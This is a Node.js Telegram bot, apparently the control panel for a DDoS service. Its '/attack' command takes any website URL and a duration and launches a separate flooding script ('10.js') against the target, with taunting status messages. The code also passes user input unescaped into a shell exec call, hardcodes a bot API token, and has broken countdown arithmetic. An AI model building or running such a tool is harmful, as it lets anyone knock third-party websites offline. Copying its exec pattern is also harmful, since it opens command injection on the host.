const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '6744405305:AAGqpL2R4HU8vn_KVfJo8r3HNZoLOyx92bU';
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userInput = match[1].split(' ');
  const targetUrl = userInput[0];
  const duration = parseInt(userInput[1]);

  if (isNaN(duration) || duration > 10000 || duration < 60) {
    bot.sendMessage(chatId, 'Time must be between 60 and 10000 seconds.');
    return;
  }

  if (targetUrl === 'none') {
    bot.sendMessage(chatId, 'Please send a valid URL.');
    return;
  }

  if (!isValidUrl(targetUrl)) {
    bot.sendMessage(chatId, 'Please send a valid URL.');
    return;
  }

  const command = `node 10.js ${targetUrl} ${duration}`;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      bot.sendMessage(chatId, 'Error occurred while running the attack.');
      return;
    }
    if (stdout.includes('ATTACK START')) {
      bot.sendMessage(chatId, '😈 ATTACK START 😈');
      countdown(chatId, duration);
    }
  });
});

function countdown(chatId, duration) {
  setTimeout(() => {
    const remainingTime = duration - 1000;
    if (remainingTime > 0) {
      bot.sendMessage(chatId, `Countdown: ${remainingTime / 1000} seconds remaining.`);
      countdown(chatId, remainingTime);
    } else {
      bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
    }
  }, 1000);
}

function isValidUrl(url) {
  try {
    new URL(url);
    return true;
  } catch (error) {
    return false;
  }
}
